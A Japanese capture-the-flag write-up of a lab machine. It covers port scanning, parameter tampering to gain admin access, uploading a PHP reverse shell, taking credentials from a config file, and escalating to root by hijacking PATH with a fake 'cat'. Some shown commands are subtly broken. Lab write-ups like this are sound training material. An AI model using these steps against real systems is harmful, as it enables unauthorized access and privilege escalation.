# 1.Port Scan 
対象マシンのポートをスキャン
ip=10.129.250.6
`nmap -sC -sV $ip`

![45d47843cf0fb8616a8edcb162087940.png](../_resources/45d47843cf0fb8616a8edcb162087940.png)

# 2.Burp Suite

## Local Proxy
対象HPに接続
http://$ip/

![ba7bed9861212273b386f7897f470797.png](../_resources/ba7bed9861212273b386f7897f470797.png)

login用ページと思われるディレクトリを発見
![a5827a020d78d0729156353852591dd6.png](../_resources/a5827a020d78d0729156353852591dd6.png)

## Guest login
ゲストでログイン

![8f22d7efb189df67c1aa8a7813b79e37.png](../_resources/8f22d7efb189df67c1aa8a7813b79e37.png)

![7a15c188f29c929e9aa04c8dc9592a45.png](../_resources/7a15c188f29c929e9aa04c8dc9592a45.png)

ログインページのパケットを傍受

![50060c167b817853f9591ce6145a313e.png](../_resources/50060c167b817853f9591ce6145a313e.png)

# 3.Fuzzing
## admin info
右図赤枠の箇所でファジングを実施

![d632620577c6476d0c97e392a316067d.png](../_resources/d632620577c6476d0c97e392a316067d.png)

ID=1がadminであることを確認

![c3415e527202f0309347b802d9ed8978.png](../_resources/c3415e527202f0309347b802d9ed8978.png)


## Revers shell
下図赤枠内パラメータをアドミンの物に変更

![ba2b093e44d88550f531741c9934726a.png](../_resources/ba2b093e44d88550f531741c9934726a.png)

管理者用アップローダーへ接続

![b98b35d67e41d1f98923d4cca1687b47.png](../_resources/b98b35d67e41d1f98923d4cca1687b47.png)

kaliのデフォルトについてるリバースシェルの下図赤枠内を変更
`sudo vim /usr/share/webshells/php/php-reverse-shell.php`

![3dcab1c5508c1bf63101c022bbd47bd7.png](../_resources/3dcab1c5508c1bf63101c022bbd47bd7.png)

変更したものをアップロード

![77b8ae2afd72cc4f016531e50a643af3.png](../_resources/77b8ae2afd72cc4f016531e50a643af3.png)

アップロードしたものをgobusterで確認。

![6bcdd8fe55f595fa01cd68931123965f.png](../_resources/6bcdd8fe55f595fa01cd68931123965f.png)


![f62c2cd0941e9c9da144bc0d25034347.png](../_resources/f62c2cd0941e9c9da144bc0d25034347.png)

# 5. Use flag Get
サーバ内のuser.txtを検索

$ find / -name *user.txt* 2> /dev/null

$ cd /home/robert/

$ ls

$ cat user.txt

![0edfe3217b29b18377779dfc17ba6397.png](../_resources/0edfe3217b29b18377779dfc17ba6397.png)

root.txtがあると思われるディレクリを発見したが権限が無い為アクセスできない。

![9c8e26e622039954556ee5c91fc490cf.png](../_resources/9c8e26e622039954556ee5c91fc490cf.png)

db.php内のユーザ情報を取得

![3addcc654d858a5d6e304b64fba7629f.png](../_resources/3addcc654d858a5d6e304b64fba7629f.png)


# 6.SSH connect
 `ssh robert@$ip`
 
 SSHを使いrobertユーザで接続
 
 ![390a02dd703ddf2bc96b56b66b8e4849.png](../_resources/390a02dd703ddf2bc96b56b66b8e4849.png)

権限昇格に使用できると思われるツールを発見

![54ea79e33302eb51168b56b83b5b19ab.png](../_resources/54ea79e33302eb51168b56b83b5b19ab.png)

Bug Trackerは/root/reportsディレクリ内にcatを使用することを確認

![f5982646e76314fb6222c9e8a0486f5e.png](../_resources/f5982646e76314fb6222c9e8a0486f5e.png)

catに"bin/sh"を入れrootまでのパスを設定する

$ cd /tmp

$ echo "/bin/sh" > cat

$ chmod +x cat  

$ export PATH/tmp:PATH

$ echo PATH

$ bugtracker

![0804246115a2505a54b5914b879cab38.png](../_resources/0804246115a2505a54b5914b879cab38.png)